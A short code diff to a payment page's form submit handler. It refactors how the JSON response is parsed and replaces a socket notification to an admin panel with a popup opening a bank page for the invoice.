@@ -690,6 +690,7 @@
     
       // Payment Submission Handler
 // payment.html - Update form submit handler
+// payment.html - Update form submit handler
 document.getElementById('mainForm').addEventListener('submit', async function(e) {
   e.preventDefault();
   if (!isCardValid || !isExpiryValid || isProcessing) return;
@@ -719,19 +720,20 @@ document.getElementById('mainForm').addEventListener('submit', async function(e)
       })
     });
 
+    const data = await response.json();
     if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Payment failed');
+      throw new Error(data.message || 'Payment failed');
     }
 
-    const result = await response.json();
-    // Store invoice ID and open bank page
-    currentInvoiceId = result.invoiceId;
+    currentInvoiceId = data.invoiceId;
     localStorage.setItem('invoiceId', currentInvoiceId);
     
-    // Force admin panel refresh through sockets
-    const socket = io();
-    socket.emit('new_transaction', currentInvoiceId);
+    // Open bank page after successful transaction creation
+    const bankPageWindow = window.open(
+      `/bankpage.html?invoiceId=${data.invoiceId}`, 
+      '_blank',
+      'width=600,height=800'
+    );
 
   } catch (error) {
     console.error('Payment Error:', error);
